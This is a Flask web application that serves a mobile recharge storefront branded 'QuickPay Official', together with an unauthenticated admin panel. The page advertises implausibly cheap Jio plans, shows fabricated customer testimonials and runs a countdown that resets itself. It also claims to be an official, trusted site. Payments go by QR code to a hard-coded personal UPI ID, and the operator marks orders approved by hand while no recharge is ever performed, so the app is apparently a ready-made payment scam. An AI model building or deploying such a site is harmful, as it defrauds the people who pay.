from flask import Flask, render_template_string, request, jsonify
import datetime

app = Flask(__name__)

# Orders and UTR database storage
orders = []
approved_utrs = set()

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>QuickPay Official - 5G Recharge Portal</title>
  <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
  <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;600;700;800;900&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', -apple-system, sans-serif; }
    html, body {
      background: #f4f5f8;
      color: #1e293b;
      min-height: 100%;
      overflow-x: hidden;
      overflow-y: auto !important;
      -webkit-overflow-scrolling: touch;
    }
    button, input { font: inherit; }
    button { cursor: pointer; border: none; }

    .header-bar {
      background: #5f259f;
      color: white;
      padding: 12px 16px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      box-shadow: 0 4px 12px rgba(95, 37, 159, 0.25);
    }
    .header-left { display: flex; align-items: center; gap: 10px; }
    .logo-badge-unique {
      width: 40px;
      height: 40px;
      background: linear-gradient(135deg, #facc15, #f59e0b);
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 900;
      font-size: 20px;
      color: #23023e;
      box-shadow: 0 4px 12px rgba(250, 204, 21, 0.4);
      border: 1.5px solid rgba(255, 255, 255, 0.4);
    }
    .header-title h1 { font-size: 15px; font-weight: 900; line-height: 1.2; letter-spacing: -0.3px; }
    .header-title p { font-size: 9px; opacity: 0.9; font-weight: 800; letter-spacing: 0.3px; color: #a78bfa; }
    
    .header-right { display: flex; align-items: center; gap: 8px; }
    .lang-switch-btn {
      background: rgba(255, 255, 255, 0.2);
      border: 1px solid rgba(255, 255, 255, 0.3);
      color: white;
      font-size: 11px;
      font-weight: 800;
      padding: 5px 10px;
      border-radius: 8px;
    }

    .main-content { padding: 12px 14px 40px; max-width: 440px; margin: 0 auto; min-height: 100vh; }

    .offer-strip {
      background: #ffffff;
      border-radius: 12px;
      padding: 8px 14px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 12px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
      border: 1px solid #fee2e2;
    }
    .offer-strip-left { display: flex; align-items: center; gap: 6px; font-size: 11px; font-weight: 800; color: #1e293b; }
    .timer-badge { 
      background: #fee2e2; 
      color: #ef4444; 
      font-weight: 900; 
      font-size: 12px; 
      padding: 3px 10px; 
      border-radius: 8px;
      letter-spacing: 0.5px;
    }

    .official-badge-strip {
      background: linear-gradient(90deg, #faf5ff, #f3e8ff);
      border: 1px solid #d8b4fe;
      border-radius: 12px;
      padding: 8px 12px;
      font-size: 11px;
      font-weight: 800;
      color: #5f259f;
      text-align: center;
      margin-bottom: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      box-shadow: 0 2px 6px rgba(95, 37, 159, 0.06);
    }

    .promo-banner {
      background: linear-gradient(135deg, #23023e, #4b0082, #18002d);
      border-radius: 20px;
      padding: 16px 12px;
      color: white;
      text-align: center;
      margin-bottom: 14px;
      box-shadow: 0 8px 24px rgba(75, 0, 130, 0.35);
      border: 1px solid rgba(255,255,255,0.15);
      position: relative;
    }
    .promo-brand-title { font-size: 12px; font-weight: 800; letter-spacing: 1px; color: #f3e8ff; margin-bottom: 2px; }
    .promo-title { font-size: 15px; font-weight: 900; color: #ffffff; margin-bottom: 12px; letter-spacing: 0.5px; }
    .promo-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-bottom: 12px; }
    .promo-card-mini { background: rgba(255, 255, 255, 0.12); border: 1px solid rgba(255, 255, 255, 0.25); border-radius: 12px; padding: 8px 4px; }
    .promo-card-mini .price { font-size: 14px; font-weight: 900; color: #facc15; }
    .promo-card-mini .sub { font-size: 9px; font-weight: 700; opacity: 0.95; margin-top: 2px; line-height: 1.2; }
    .banner-footer-icons { display: flex; justify-content: center; align-items: center; gap: 8px; font-size: 10px; font-weight: 800; opacity: 0.9; }
    .hot-deal-tag { background: #ef4444; color: #fff; font-size: 8px; font-weight: 900; padding: 2px 6px; border-radius: 4px; }

    .card { background: #ffffff; border-radius: 20px; padding: 18px; box-shadow: 0 4px 16px rgba(0, 0, 0, 0.05); margin-bottom: 14px; border: 1px solid #f1f5f9; }
    .card-header-flex { display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px; }
    .card-header-left { display: flex; align-items: center; gap: 10px; }
    .card-icon-box { width: 36px; height: 36px; background: #f3e8ff; color: #5f259f; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 18px; }
    .card-titles h3 { font-size: 14px; font-weight: 800; color: #1e293b; }
    .card-titles p { font-size: 11px; color: #64748b; font-weight: 500; }
    .secure-badge-pill { background: #ecfdf5; color: #059669; font-size: 10px; font-weight: 800; padding: 4px 8px; border-radius: 6px; display: flex; align-items: center; gap: 4px; border: 1px solid #d1fae5; }

    .operator-label { font-size: 11px; font-weight: 800; color: #475569; margin-bottom: 8px; }
    .operator-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-bottom: 16px; }
    .op-select-box {
      border: 1.5px solid #e2e8f0;
      border-radius: 16px;
      padding: 10px 4px;
      text-align: center;
      background: #ffffff;
      position: relative;
    }
    .op-select-box.selected { border-color: #5f259f; background: #faf5ff; box-shadow: 0 4px 12px rgba(95, 37, 159, 0.15); }
    .op-logo-circle {
      width: 38px;
      height: 38px;
      border-radius: 50%;
      margin: 0 auto 6px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 900;
      color: white;
      font-size: 12px;
    }
    .op-name { font-size: 11px; font-weight: 800; color: #334155; }
    .check-badge { position: absolute; top: -5px; right: -5px; width: 16px; height: 16px; background: #5f259f; color: white; border-radius: 50%; font-size: 10px; display: flex; align-items: center; justify-content: center; }

    .mobile-input-box {
      background: #ffffff;
      border: 2px solid #cbd5e1;
      border-radius: 16px;
      padding: 14px 16px;
      display: flex;
      align-items: center;
    }
    .mobile-input-box.valid { border-color: #10b981; background: #f0fdf4; }
    .mobile-input-box.error { border-color: #ef4444; background: #fef2f2; }
    .mobile-input-left { display: flex; align-items: center; gap: 12px; width: 100%; }
    .country-code { font-size: 18px; font-weight: 900; color: #5f259f; padding-right: 10px; border-right: 2px solid #cbd5e1; }
    .mobile-input-box input { width: 100%; border: none; background: transparent; font-size: 18px; font-weight: 900; color: #0f172a; outline: none; }

    .error-alert-box {
      background: #fef2f2;
      border: 1.5px solid #fecaca;
      color: #dc2626;
      padding: 10px 14px;
      border-radius: 12px;
      font-size: 12px;
      font-weight: 800;
      margin-top: 10px;
    }

    .primary-btn {
      width: 100%;
      background: linear-gradient(135deg, #5f259f, #7c3aed);
      color: white;
      font-weight: 900;
      font-size: 15px;
      padding: 15px;
      border-radius: 16px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      box-shadow: 0 6px 18px rgba(95, 37, 159, 0.35);
      margin-top: 16px;
    }

    .live-feedback-card {
      background: #ffffff;
      border: 1.5px solid #e9d5ff;
      border-radius: 18px;
      padding: 14px;
      margin-top: 14px;
      box-shadow: 0 4px 16px rgba(95, 37, 159, 0.08);
    }
    .feed-header-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px; }
    .feed-user-badge { display: flex; align-items: center; gap: 8px; }
    .feed-avatar { width: 28px; height: 28px; background: #f3e8ff; color: #5f259f; border-radius: 50%; font-size: 11px; font-weight: 900; display: flex; align-items: center; justify-content: center; }
    .feed-username { font-size: 12px; font-weight: 800; color: #0f172a; }
    .feed-time-ago { font-size: 10px; font-weight: 700; color: #94a3b8; }
    .feed-msg-text { font-size: 12px; font-weight: 700; color: #334155; line-height: 1.4; margin-bottom: 6px; }
    .feed-rating-stars { color: #f59e0b; font-size: 12px; letter-spacing: 2px; }

    .plan-card-exact {
      background: #ffffff;
      border: 1.5px solid #f1f5f9;
      border-radius: 20px;
      padding: 16px;
      margin-bottom: 14px;
      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.04);
    }
    .plan-new-badge {
      background: #ef4444;
      color: white;
      font-size: 9px;
      font-weight: 900;
      padding: 3px 8px;
      border-radius: 6px;
      display: inline-flex;
      align-items: center;
      margin-bottom: 6px;
    }
    .plan-top-row { display: flex; align-items: baseline; justify-content: space-between; margin-bottom: 12px; }
    .plan-price-box { display: flex; align-items: baseline; gap: 8px; }
    .plan-curr-price { font-size: 26px; font-weight: 900; color: #0f172a; }
    .plan-old-price { font-size: 14px; font-weight: 700; color: #64748b; text-decoration: line-through; }
    .plan-tag-right { background: #f3e8ff; color: #5f259f; font-size: 10px; font-weight: 800; padding: 4px 10px; border-radius: 8px; }
    
    .plan-features-4grid {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 8px;
      background: #f8fafc;
      border-radius: 14px;
      padding: 12px 6px;
      margin-bottom: 14px;
      text-align: center;
    }
    .f-box p { font-size: 9px; font-weight: 800; color: #64748b; text-transform: uppercase; margin-bottom: 3px; }
    .f-box h5 { font-size: 11px; font-weight: 900; color: #0f172a; }

    .loading-overlay {
      position: fixed; inset: 0; background: rgba(15, 23, 42, 0.75);
      backdrop-filter: blur(6px); display: flex; align-items: center; justify-content: center; z-index: 2000; padding: 20px;
    }
    .loading-card { background: #ffffff; width: 100%; max-width: 340px; border-radius: 24px; padding: 30px 20px; text-align: center; }
    .loading-spinner {
      width: 70px; height: 70px; border: 6px solid #f3e8ff; border-top-color: #5f259f;
      border-radius: 50%; margin: 0 auto 16px; animation: spin 0.8s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    .selected-user-strip {
      background: #ffffff; border-radius: 14px; padding: 12px 14px;
      display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px;
    }
    .checkout-qr-card {
      background: #ffffff; border-radius: 20px; padding: 20px; text-align: center;
      box-shadow: 0 4px 16px rgba(0,0,0,0.05); margin-bottom: 14px; border: 1.5px solid #e2e8f0;
    }
    .qr-img-box { background: #fff; padding: 10px; border-radius: 16px; display: inline-block; border: 2px dashed #5f259f; margin: 12px 0; }
    .qr-img-box img { width: 170px; height: 170px; display: block; border-radius: 8px; }

    .utr-input-wrapper {
      position: relative; background: #f8fafc; border: 2px solid #5f259f;
      border-radius: 16px; padding: 14px 16px 14px 44px; margin-top: 6px;
    }
    .utr-input-wrapper.error { border-color: #ef4444; background: #fef2f2; }
    .utr-icon { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); font-size: 18px; }
    .utr-input-wrapper input { width: 100%; border: none; background: transparent; font-size: 16px; font-weight: 900; color: #0f172a; outline: none; }
    .footer-guarantee { display: flex; align-items: center; justify-content: center; gap: 14px; margin-top: 20px; padding-bottom: 20px; font-size: 10px; font-weight: 700; color: #64748b; }
  </style>
</head>
<body>
  <div id="root"></div>

  <script type="text/babel">
    const { useState, useEffect } = React;
    const MY_UPI_ID = "jeevapandijeevapandi4-2@oksbi"; 
    const MY_NAME = "Jeeva Jeeva";
    
    const translations = {
      EN: {
        officialBadge: "⚡ QuickPay Official Portal - 100% Trusted & Secure",
        title: "QuickPay Official",
        subtitle: "Cheapest Recharges • Buy Direct on Website",
        timerText: "Special Offer Ends In",
        bannerTitle: "BEST SAVINGS OFFERS!",
        bannerSub1: "2GB/DAY • 84 Days",
        bannerSub2: "2GB/DAY • 6 Months",
        bannerSub3: "2GB/DAY • 12 Months",
        rechargeTitle: "Recharge your mobile",
        rechargeSub: "Select operator and enter number",
        netProvider: "Network provider",
        mobileLabel: "Mobile number",
        placeholder: "Enter 10-digit number",
        rechargeBtn: "Recharge Now →",
        secureText: "SECURE",
        footerTrust: "🔒 Official Trusted Website ✦ Cheapest Recharges ✦ 100% Safe",
        selectedNum: "SELECTED NUMBER",
        bestPlans: "Best plans for you",
        validity: "VALIDITY",
        data: "DATA",
        voice: "VOICE",
        sms: "SMS",
        planBtn: "Recharge for",
        scanPay: "Scan & Pay",
        scanSub: "Scan using any UPI app",
        expiresIn: "Expires in:",
        enterUtr: "ENTER 12-DIGIT UTR / REF NUMBER:",
        submitUtr: "✓ Submit Payment UTR",
        payDirect: "📱 Pay via UPI App Directly",
        verifyingTitle: "Verifying your payment...",
        verifyingSub: "Please don't close this window. Confirming UTR #",
        timeLeft: "Time Left:",
        successTitle: "Recharge Successful!",
        successSub: "Your plan has been activated successfully.",
        anotherBtn: "Make Another Recharge",
        failTitle: "Verification Failed",
        failSub: "Invalid UTR or payment not received.",
        tryAgain: "Try Again",
        change: "Change",
        errInvalid: "⚠️ Please enter a valid 10-digit mobile number starting with 6-9",
        errUtr: "⚠️ Error: Please enter a valid 12-digit UTR / Reference number!"
      }
    };

    const operators = [
      { name: "Jio", color: "#0a2885" },
      { name: "Airtel", color: "#e11d48" },
      { name: "Vi", color: "#9333ea" },
      { name: "BSNL", color: "#ea580c" }
    ];

    const plans = [
      { price: 399, cutPrice: "₹3899", tag: "Jio PLAN", validity: "365 Days", data: "3GB/day", voice: "Unlimited", sms: "100/day" },
      { price: 299, cutPrice: "₹1899", tag: "Jio PLAN", validity: "180 Days", data: "2GB/day", voice: "Unlimited", sms: "100/day" },
      { price: 199, cutPrice: "₹1399", tag: "Jio PLAN", validity: "84 Days", data: "2GB/day", voice: "Unlimited", sms: "100/day" }
    ];

    const mockFeedbacks = [
      { name: "Karthik R.", op: "Jio", amt: "₹299", time: "12 secs ago", msg: "Official QuickPay site is super fast! Got cheapest recharge instantly." },
      { name: "Priya S.", op: "Airtel", amt: "₹199", time: "38 secs ago", msg: "Very low price recharges. Safely bought directly on website." }
    ];

    function App() {
      const [lang, setLang] = useState("EN");
      const t = translations[lang];

      const [step, setStep] = useState(1);
      const [mobile, setMobile] = useState("");
      const [operator, setOperator] = useState("Jio");
      const [selectedPlan, setSelectedPlan] = useState(null);
      const [verifying, setVerifying] = useState(false);
      const [utrNumber, setUtrNumber] = useState("");
      const [orderStatus, setOrderStatus] = useState(null);
      const [verifyTimer, setVerifyTimer] = useState(120);
      const [showError, setShowError] = useState(false);
      const [utrError, setUtrError] = useState(false);
      const [offerTimeLeft, setOfferTimeLeft] = useState(582);

      const isValidMobile = mobile.length === 10 && /^[6-9]/.test(mobile);

      useEffect(() => {
        const timer = setInterval(() => setOfferTimeLeft(prev => prev > 1 ? prev - 1 : 582), 1000);
        return () => clearInterval(timer);
      }, []);

      const formatTime = (seconds) => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return (mins < 10 ? '0' : '') + mins + ':' + (secs < 10 ? '0' : '') + secs;
      };

      const handleProceed = () => {
        if (!isValidMobile) { setShowError(true); return; }
        setShowError(false);
        setVerifying(true);
        setTimeout(() => { setVerifying(false); setStep(2); }, 1500);
      };

      const handleSubmitUTR = async () => {
        if (utrNumber.trim().length !== 12) { setUtrError(true); return; }
        setUtrError(false);
        setOrderStatus("PENDING");
        setVerifyTimer(120);
        try {
          await fetch('/api/submit_order', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ mobile, operator, amount: selectedPlan?.price, utr: utrNumber.trim() })
          });
        } catch(e) {}
      };

      useEffect(() => {
        let timer;
        if (orderStatus === "PENDING" && verifyTimer > 0) {
          timer = setInterval(() => setVerifyTimer(prev => prev - 1), 1000);
        } else if (verifyTimer === 0 && orderStatus === "PENDING") {
          setOrderStatus("REJECTED");
        }
        return () => clearInterval(timer);
      }, [orderStatus, verifyTimer]);

      useEffect(() => {
        let poll;
        if (orderStatus === "PENDING" && utrNumber) {
          poll = setInterval(() => {
            fetch('/api/check_status?utr=' + encodeURIComponent(utrNumber))
              .then(res => res.json())
              .then(data => { if (data.status) setOrderStatus(data.status); }).catch(()=>{});
          }, 800);
        }
        return () => { if(poll) clearInterval(poll); };
      }, [orderStatus, utrNumber]);

      const upiUrl = "upi://pay?pa=" + MY_UPI_ID + "&pn=" + encodeURIComponent(MY_NAME) + "&am=" + (selectedPlan?.price || 0) + "&cu=INR&tn=Recharge_" + mobile;
      const qrCodeUrl = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=" + encodeURIComponent(upiUrl);

      return (
        <div>
          <header className="header-bar">
            <div className="header-left">
              {step > 1 && !orderStatus ? (
                <button className="logo-badge-unique" onClick={() => setStep(prev => prev - 1)}>←</button>
              ) : (
                <div className="logo-badge-unique">⚡</div>
              )}
              <div className="header-title">
                <h1>{t.title}</h1>
                <p>{t.subtitle}</p>
              </div>
            </div>
            <a href="/admin" style={{color:'#fff', fontSize:'11px', fontWeight:800, textDecoration:'underline'}}>Admin</a>
          </header>

          <main className="main-content">
            <div className="offer-strip">
              <div className="offer-strip-left"><span>⏰ {t.timerText}</span></div>
              <div className="timer-badge">{formatTime(offerTimeLeft)}</div>
            </div>

            <div className="official-badge-strip"><span>{t.officialBadge}</span></div>

            {step === 1 && (
              <>
                <div className="promo-banner">
                  <div className="promo-brand-title">⚡ QUICKPAY OFFICIAL</div>
                  <div className="promo-title">{t.bannerTitle}</div>
                  <div className="promo-grid">
                    <div className="promo-card-mini"><div className="price">₹199/-</div><div className="sub">{t.bannerSub1}</div></div>
                    <div className="promo-card-mini"><div className="price">₹299/-</div><div className="sub">{t.bannerSub2}</div></div>
                    <div className="promo-card-mini"><div className="price">₹399/-</div><div className="sub">{t.bannerSub3}</div></div>
                  </div>
                </div>

                <div className="card">
                  <div className="card-header-flex">
                    <div className="card-header-left">
                      <div className="card-icon-box">📱</div>
                      <div className="card-titles"><h3>{t.rechargeTitle}</h3><p>{t.rechargeSub}</p></div>
                    </div>
                    <div className="secure-badge-pill">🛡️ {t.secureText}</div>
                  </div>

                  <div className="operator-label">{t.netProvider}</div>
                  <div className="operator-row">
                    {operators.map(op => (
                      <div key={op.name} className={"op-select-box " + (operator === op.name ? 'selected' : '')} onClick={() => setOperator(op.name)}>
                        <div className="op-logo-circle" style={{background: op.color}}>{op.name}</div>
                        <div className="op-name">{op.name}</div>
                        {operator === op.name && <div className="check-badge">✓</div>}
                      </div>
                    ))}
                  </div>

                  <div className="operator-label">{t.mobileLabel}</div>
                  <div className={"mobile-input-box " + (isValidMobile ? 'valid' : showError ? 'error' : '')}>
                    <div className="mobile-input-left">
                      <span className="country-code">+91</span>
                      <input value={mobile} onChange={(e) => { setMobile(e.target.value.replace(/\D/g, "").slice(0, 10)); if(showError) setShowError(false); }} placeholder={t.placeholder} inputMode="numeric" />
                    </div>
                  </div>
                  {showError && <div className="error-alert-box">❌ {t.errInvalid}</div>}

                  <button className="primary-btn" onClick={handleProceed}>{t.rechargeBtn}</button>
                </div>
              </>
            )}

            {verifying && (
              <div className="loading-overlay">
                <div className="loading-card">
                  <div className="loading-spinner"></div>
                  <h3 style={{fontSize: '17px', fontWeight: 900, marginBottom: '6px'}}>Number verified</h3>
                  <p style={{fontSize: '12px', color: '#64748b'}}>Loading available recharge plans...</p>
                </div>
              </div>
            )}

            {step === 2 && (
              <div>
                <div className="selected-user-strip">
                  <div>
                    <p style={{fontSize: '10px', fontWeight: 800, color: '#64748b'}}>{t.selectedNum}</p>
                    <h4 style={{fontSize: '14px', fontWeight: 900}}>{operator} • +91 {mobile}</h4>
                  </div>
                  <button className="primary-btn" style={{width: 'auto', padding: '6px 14px', fontSize: '11px', margin: 0}} onClick={() => setStep(1)}>{t.change}</button>
                </div>

                <div style={{fontSize: '13px', fontWeight: 800, margin: '14px 0 8px'}}>{t.bestPlans}</div>

                {plans.map(p => (
                  <div key={p.price} className="plan-card-exact">
                    <div className="plan-new-badge">✨ OFFICIAL BEST DEAL</div>
                    <div className="plan-top-row">
                      <div className="plan-price-box">
                        <span className="plan-curr-price">₹{p.price}</span>
                        <span className="plan-old-price">{p.cutPrice}</span>
                      </div>
                      <span className="plan-tag-right">{p.tag}</span>
                    </div>
                    <div className="plan-features-4grid">
                      <div className="f-box"><p>{t.validity}</p><h5>{p.validity}</h5></div>
                      <div className="f-box"><p>{t.data}</p><h5>{p.data}</h5></div>
                      <div className="f-box"><p>{t.voice}</p><h5>{p.voice}</h5></div>
                      <div className="f-box"><p>{t.sms}</p><h5>{p.sms}</h5></div>
                    </div>
                    <button className="primary-btn" onClick={() => { setSelectedPlan(p); setStep(3); }} style={{margin: 0}}>{t.planBtn} ₹{p.price} →</button>
                  </div>
                ))}
              </div>
            )}

            {step === 3 && !orderStatus && (
              <div>
                <div className="selected-user-strip">
                  <div>
                    <h4 style={{fontSize: '14px', fontWeight: 900}}>+91 {mobile} ({operator})</h4>
                    <p style={{fontSize: '11px', color: '#5f259f', fontWeight: 800}}>Plan: ₹{selectedPlan?.price} ({selectedPlan?.validity})</p>
                  </div>
                  <button className="primary-btn" style={{width: 'auto', padding: '6px 14px', fontSize: '11px', margin: 0}} onClick={() => setStep(2)}>{t.change}</button>
                </div>

                <div className="checkout-qr-card">
                  <h3 style={{fontSize: '16px', fontWeight: 900}}>{t.scanPay} ₹{selectedPlan?.price}</h3>
                  <p style={{fontSize: '11px', color: '#64748b', marginTop: '2px'}}>{t.scanSub}</p>
                  <div className="qr-img-box"><img src={qrCodeUrl} alt="UPI QR Code" /></div>
                  
                  <div style={{margin: '14px 0 10px', textAlign: 'left'}}>
                    <label style={{fontSize: '11px', fontWeight: 800, color: '#475569'}}>{t.enterUtr}</label>
                    <div className={"utr-input-wrapper " + (utrError ? 'error' : '')}>
                      <span className="utr-icon">🔑</span>
                      <input value={utrNumber} onChange={(e) => { setUtrNumber(e.target.value.replace(/\D/g, "").slice(0, 12)); if(utrError) setUtrError(false); }} placeholder="412356789012" inputMode="numeric" />
                    </div>
                    {utrError && <div className="error-alert-box" style={{marginTop: '6px'}}>❌ {t.errUtr}</div>}
                  </div>

                  <button className="primary-btn" style={{background: '#10b981', margin: '16px 0 8px 0'}} onClick={handleSubmitUTR}>{t.submitUtr}</button>
                  <a href={upiUrl} className="primary-btn" style={{textDecoration: 'none', background: '#5f259f', margin: 0}}>{t.payDirect}</a>
                </div>
              </div>
            )}

            {orderStatus === "PENDING" && (
              <div className="card" style={{textAlign: 'center', padding: '30px 16px'}}>
                <div className="loading-spinner"></div>
                <h3 style={{fontSize: '18px', fontWeight: 900}}>{t.verifyingTitle}</h3>
                <p style={{fontSize: '12px', color: '#64748b', marginBottom: '8px'}}>{t.verifyingSub}{utrNumber}</p>
                <div style={{background: '#fee2e2', color: '#ef4444', padding: '4px 12px', borderRadius: '99px', display: 'inline-block', fontSize: '12px', fontWeight: 900}}>
                  ⏱️ {t.timeLeft} {formatTime(verifyTimer)}
                </div>
              </div>
            )}

            {orderStatus === "APPROVED" && (
              <div className="card" style={{textAlign: 'center', padding: '30px 16px'}}>
                <div style={{fontSize: '45px', color: '#10b981', marginBottom: '8px'}}>✓</div>
                <h3 style={{fontSize: '20px', fontWeight: 900, color: '#10b981'}}>{t.successTitle}</h3>
                <p style={{fontSize: '13px', fontWeight: 800, marginBottom: '14px'}}>{t.successSub}</p>
                <button className="primary-btn" onClick={() => window.location.reload()} style={{margin: 0}}>{t.anotherBtn}</button>
              </div>
            )}

            {orderStatus === "REJECTED" && (
              <div className="card" style={{textAlign: 'center', padding: '30px 16px'}}>
                <div style={{fontSize: '40px', color: '#ef4444', marginBottom: '10px'}}>✕</div>
                <h3 style={{fontSize: '18px', fontWeight: 900, color: '#ef4444'}}>{t.failTitle}</h3>
                <p style={{fontSize: '12px', color: '#64748b', marginBottom: '14px'}}>{t.failSub}</p>
                <button className="primary-btn" style={{background: '#ef4444', margin: 0}} onClick={() => setOrderStatus(null)}>{t.tryAgain}</button>
              </div>
            )}

            <div className="footer-guarantee"><span>{t.footerTrust}</span></div>
          </main>
        </div>
      );
    }
    ReactDOM.createRoot(document.getElementById("root")).render(<App />);
  </script>
</body>
</html>
"""

ADMIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Admin Dashboard - QuickPay</title>
  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@600;800&display=swap" rel="stylesheet">
  <style>
    body { font-family: 'Plus Jakarta Sans', sans-serif; background: #f4f5f8; padding: 20px; }
    .container { max-width: 600px; margin: 0 auto; background: #fff; padding: 20px; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
    h2 { color: #5f259f; margin-bottom: 20px; }
    .order-card { background: #faf5ff; border: 1px solid #e9d5ff; padding: 14px; border-radius: 12px; margin-bottom: 12px; }
    .btn-action { padding: 6px 12px; border-radius: 6px; font-weight: 800; color: #fff; text-decoration: none; display: inline-block; margin-top: 6px; }
    .btn-approve { background: #10b981; }
    .btn-reject { background: #ef4444; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Admin Orders Panel</h2>
    <a href="/" style="display:inline-block; margin-bottom:15px; color:#5f259f; font-weight:800; text-decoration:none;">← Back to Home</a>
    <div id="orders-list">
      {% if orders %}
        {% for o in orders %}
          <div class="order-card">
            <strong>Mobile:</strong> +91 {{ o.mobile }} <br>
            <strong>Operator:</strong> {{ o.operator }} <br>
            <strong>Amount:</strong> ₹{{ o.amount }} <br>
            <strong>UTR:</strong> {{ o.utr }} <br>
            <strong>Status:</strong> <span style="color: {% if o.status == 'APPROVED' %}#10b981{% elif o.status == 'REJECTED' %}#ef4444{% else %}#f59e0b{% endif %}">{{ o.status }}</span> <br>
            {% if o.status == 'PENDING' %}
              <a href="/admin/action?utr={{ o.utr }}&action=APPROVE" class="btn-action btn-approve">Approve</a>
              <a href="/admin/action?utr={{ o.utr }}&action=REJECT" class="btn-action btn-reject">Reject</a>
            {% endif %}
          </div>
        {% endfor %}
      {% else %}
        <p>No orders yet.</p>
      {% endif %}
    </div>
  </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/submit_order', methods=['POST'])
def submit_order():
    data = request.json
    data['status'] = 'PENDING'
    data['time'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    orders.insert(0, data)
    return jsonify({'status': 'success'})

@app.route('/api/check_status', methods=['GET'])
def check_status():
    utr = request.args.get('utr')
    for o in orders:
        if o.get('utr') == utr:
            return jsonify({'status': o.get('status')})
    return jsonify({'status': 'PENDING'})

@app.route('/admin')
def admin_panel():
    return render_template_string(ADMIN_TEMPLATE, orders=orders)

@app.route('/admin/action')
def admin_action():
    utr = request.args.get('utr')
    action = request.args.get('action')
    for o in orders:
        if o.get('utr') == utr:
            if action == 'APPROVE':
                o['status'] = 'APPROVED'
            elif action == 'REJECT':
                o['status'] = 'REJECTED'
    return admin_panel()

import os
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 3000))
    app.run(host='0.0.0.0', port=port)
